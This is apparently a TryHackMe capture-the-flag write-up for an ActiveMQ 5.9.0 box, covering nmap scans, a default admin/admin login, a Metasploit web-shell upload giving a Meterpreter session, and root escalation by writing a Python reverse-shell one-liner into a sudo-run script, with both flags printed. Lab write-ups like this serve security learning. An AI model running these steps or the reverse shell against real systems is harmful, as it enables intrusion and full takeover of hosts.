A Medium Box from TryHackMe

## Recon
```
❯ nmap -sS -vvv -Pn -p- --min-rate 2000 $ip
Scanned at 2023-12-02 12:11:41 GMT for 313s
Not shown: 38389 filtered tcp ports (no-response), 27143 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 61
1883/tcp  open  mqtt    syn-ack ttl 61
38271/tcp open  unknown syn-ack ttl 61


❯ nmap -sV -Pn -p1000-9999 -T5 $ip
Not shown: 6517 closed tcp ports (reset), 2481 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
1883/tcp open  mqtt?
8161/tcp open  patrol-snmp?

❯ nmap -sV -sC -p1883,8161,38271 $ip
NSE Timing: About 99.52% done; ETC: 12:31 (0:00:00 remaining)
Nmap scan report for 10.10.207.92
Host is up (0.91s latency).

PORT      STATE SERVICE    VERSION
1883/tcp  open  mqtt?
| mqtt-subscribe: 
|_  ERROR: 
8161/tcp  open  http       Jetty 7.6.9.v20130131
|_http-server-header: Jetty(7.6.9.v20130131)
38271/tcp open  tcpwrapped
```
I will go on `8161` it's an activeMQ website.
I have already exploit one here : https://blackcybersec.xyz/posts/broker-htb/
I tried `admin/admin` and i got access
```
Broker
Name 	broker
Version 	5.9.0
ID 	ID:activemq-41179-1701518749608-0:1
Uptime 	32 minutes
Store percent used 	0
Memory percent used 	0
Temp percent used 	0
```
I found the version `5.9.0`, so i will try to use metasploit.
try the web shell upload
```
multi/http/apache_activemq_upload_jsp

msf6 exploit(multi/http/apache_activemq_upload_jsp) > run
msf6 exploit(multi/http/apache_activemq_upload_jsp) > run

[*] Started reverse TCP handler on 10.4.26.216:1337 
[*] Uploading http://10.10.80.199:8161//opt/apache-activemq-5.9.0/webapps/api//HgQtiuRNsHb.jar
[*] Uploading http://10.10.80.199:8161//opt/apache-activemq-5.9.0/webapps/api//HgQtiuRNsHb.jsp
[*] Sending stage (58829 bytes) to 10.10.80.199
[+] Deleted /opt/apache-activemq-5.9.0/webapps/api//HgQtiuRNsHb.jar
[+] Deleted /opt/apache-activemq-5.9.0/webapps/api//HgQtiuRNsHb.jsp
[*] Meterpreter session 1 opened (10.4.26.216:1337 -> 10.10.80.199:53542) at 2023-12-02 14:28:28 +0000

meterpreter > 
meterpreter > sysinfo 
Computer        : activemq
OS              : Linux 4.15.0-128-generic (amd64)
Architecture    : x64
System Language : en
Meterpreter     : java/linux
meterpreter > 

```
it works
```
cat flag.txt
THM{you_got_a_m3ss4ge}
```

## Escalation
```
activemq@activemq:/home$ sudo -l
sudo -l
Matching Defaults entries for activemq on activemq:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py

activemq@activemq:/home$ ls -la /opt/apache-activemq-5.9.0/subscribe.py
ls -la /opt/apache-activemq-5.9.0/subscribe.py
-rw-rw-r-- 1 activemq activemq 768 Dec 25  2020 /opt/apache-activemq-5.9.0/subscribe.py
activemq@activemq:/home$ 
```
I can write and read on the file
```
activemq@activemq:/home$ cat /opt/apache-activemq-5.9.0/subscribe.py
cat /opt/apache-activemq-5.9.0/subscribe.py
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, rc):

	if rc == 0:
		print("Successfully connected to broker {0}, subscribing to topic '{1}' now".format(hostname,topic))
		client.subscribe(topic, qos=2)
	else:
		print("Could not connect to broker {0}".format(hostname))

def on_message(client, userdata, msg):
	
	print("Received message on topic '{0}' with payload '{1}'".format(str(msg.topic),str(msg.payload).replace("'","").replace("b","")))


topic = "secret_chat"
hostname = "localhost"
port = 1883

client = mqtt.Client(client_id="wergiegbnvj371429", protocol=mqtt.MQTTv31, clean_session=True)
client.on_connect = on_connect
client.on_message = on_message
client.connect(hostname, port, 60)
client.loop_forever()
activemq@activemq:/home$
```
So i will add a shell on it 

```
activemq@activemq:/home$ cat /opt/apache-activemq-5.9.0/subscribe.py
cat /opt/apache-activemq-5.9.0/subscribe.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.26.216",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
activemq@activemq:/home$ 
```
and then run using root user
```
activemq@activemq:/home$ sudo -u root /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
sudo -u root /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py


❯ sudo rlwrap nc -lnvp 1338
listening on [any] 1338 ...
connect to [10.4.26.216] from (UNKNOWN) [10.10.80.199] 51706
# id
id
uid=0(root) gid=0(root) groups=0(root)
# 

# ls
ls
root.txt
# cat root.txt
cat root.txt
THM{br34k_br0k3_br0k3r}
# 

```